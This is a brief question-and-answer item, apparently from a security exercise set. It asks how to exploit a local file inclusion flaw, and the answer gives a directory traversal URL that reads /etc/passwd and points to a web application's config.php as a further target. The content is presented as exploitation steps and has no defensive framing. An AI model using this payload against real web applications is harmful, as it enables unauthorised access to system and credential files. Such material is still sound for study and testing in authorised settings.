Question: A web application has an LFI vulnerability. Exploit it to read sensitive files.

Answer:

1. Identify LFI: http://example.com/?file=../../../../etc/passwd.
2. Use traversal techniques to access other sensitive files like /var/www/html/config.php.
